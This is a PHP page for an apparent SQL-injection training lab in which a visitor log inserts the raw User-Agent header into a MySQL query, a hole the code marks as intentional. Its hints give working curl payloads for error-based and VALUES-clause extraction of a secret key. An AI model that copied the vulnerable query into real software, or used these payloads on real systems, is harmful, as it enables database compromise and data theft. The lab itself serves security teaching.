<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   SYSTEM KEY VERIFY
===================== */
if (isset($_POST['system_key'])) {
    $submitted = $_POST['system_key'];

    $res = mysqli_query(
        $conn,
        "SELECT key_value FROM system_keys WHERE key_name = 'master' LIMIT 1"
    );
    $row = mysqli_fetch_assoc($res);

    if ($row && $submitted === $row['key_value']) {
        $_SESSION['mysql_lab16_solved'] = true;
        header("Location: " . url_lab_from_slug("mysql/lab16", $mode));
        exit;
    } else {
        $verify_error = "Incorrect. Keep trying!";
    }
}

/* =====================
   LOG VISITOR ON EVERY PAGE LOAD
===================== */
$log_error   = null;
$log_success = false;

$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';

// INTENTIONALLY VULNERABLE. User-Agent header directly concatenated into INSERT
$log_query = "INSERT INTO visitors (ip_address, user_agent, visit_time) VALUES ('$ip', '$ua', NOW())";

mysqli_report(MYSQLI_REPORT_OFF);
$log_result = @mysqli_query($conn, $log_query);

if ($log_result) {
    $log_success = true;
} else {
    $log_error = mysqli_error($conn);
}
mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 16. Header Injection: User-Agent</h3>

    <h4>Scenario</h4>
    <p>
        A visitor logging page records your <strong>IP address</strong> and
        <strong>User-Agent</strong> to the database on every page visit. The page displays
        recent visitors in a table below.
    </p>
    <p>
        <strong>Tip:</strong> Not all injection points are in form fields. HTTP headers such
        as <code>User-Agent</code>, <code>Referer</code>, <code>X-Forwarded-For</code>, and
        <code>Cookie</code> are also commonly stored in databases: and can be vulnerable
        to injection if not properly sanitized.
    </p>
    <p>
        In this lab, the injection point is the <strong>User-Agent HTTP header</strong>.
        You will need to use tools like <code>curl</code> or <strong>Burp Suite</strong> to
        craft custom headers: there is no form field to type into.
    </p>

    <h4>Objective</h4>
    <p>
        Extract the <strong>key_value</strong> from the <code>system_keys</code> table
        (where <code>key_name = 'master'</code>) by injecting through the
        <code>User-Agent</code> header. Submit the value below.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. Visit the page normally: your real User-Agent appears in the log.<br>
        2. Send a custom UA: <code>curl -H "User-Agent: test123" URL</code>: see &ldquo;test123&rdquo; in the log.<br>
        3. Trigger an error: <code>curl -H "User-Agent: '" URL</code>: the error reveals the INSERT context.<br>
        4. Error-based extraction:<br>
        <code>curl -H "User-Agent: test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT key_value FROM system_keys WHERE key_name='master'))) AND '1'='1" URL</code><br>
        5. The XPATH error will contain the flag prefixed with <code>~</code>.<br>
        6. Alternative: inject into VALUES:<br>
        <code>curl -H "User-Agent: test', (SELECT key_value FROM system_keys WHERE key_name='master')) -- -" URL</code><br>
        but be careful: the column count must match.
    </div>

</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit System Key</h4>
    <form method="POST" class="form-row">
<input type="text" name="system_key" class="input" placeholder="Enter the master key value..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mysql_lab16_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You successfully extracted the system key through SQL injection in the User-Agent HTTP header.</div>
    </div>
</div>

<?php else: ?>

<!-- Visit Logging Status -->
<div class="card">
    <h4>Visitor Logging</h4>

    <!-- Show the INSERT query that was executed -->
    <div class="terminal">
        <div class="terminal-header">
            <span class="terminal-dot red"></span>
            <span class="terminal-dot yellow"></span>
            <span class="terminal-dot green"></span>
            <span class="terminal-title">MySQL Query (executed on page load)</span>
        </div>
        <div class="terminal-body" data-highlight="sql">
            <span class="prompt">mysql&gt; </span><?= htmlspecialchars($log_query) ?>
        </div>
    </div>

    <?php if ($log_success): ?>
        <div class="result-data result-box"><strong>Your visit has been logged.</strong> IP: <?= htmlspecialchars($ip) ?></div>
    <?php endif; ?>

    <?php if ($log_error): ?>
        <div class="result-error result-box"><strong>MySQL Error:</strong> <?= htmlspecialchars($log_error) ?></div>
    <?php endif; ?>
</div>

<!-- Recent Visitors Table -->
<div class="card">
    <h4>Recent Visitors</h4>
    <?php
    mysqli_report(MYSQLI_REPORT_OFF);
    $visitors = @mysqli_query($conn, "SELECT ip_address, user_agent, visit_time FROM visitors ORDER BY id DESC LIMIT 10");
    mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);

    if ($visitors && mysqli_num_rows($visitors) > 0):
    ?>
    <div class="result-data result-box">
        <table style="width:100%; border-collapse:collapse;">
            <tr>
                <th style="text-align:left; padding:6px; border-bottom:1px solid #444;">IP Address</th>
                <th style="text-align:left; padding:6px; border-bottom:1px solid #444;">User-Agent</th>
                <th style="text-align:left; padding:6px; border-bottom:1px solid #444;">Visit Time</th>
            </tr>
            <?php while ($row = mysqli_fetch_assoc($visitors)): ?>
            <tr>
                <td style="padding:6px; border-bottom:1px solid #333;"><?= htmlspecialchars($row['ip_address'] ?? '') ?></td>
                <td style="padding:6px; border-bottom:1px solid #333; max-width:400px; word-break:break-all;"><?= htmlspecialchars($row['user_agent'] ?? '') ?></td>
                <td style="padding:6px; border-bottom:1px solid #333;"><?= htmlspecialchars($row['visit_time'] ?? '') ?></td>
            </tr>
            <?php endwhile; ?>
        </table>
    </div>
    <?php else: ?>
        <div class="result-warning result-box">No visitor records found.</div>
    <?php endif; ?>
</div>

<?php endif; ?>
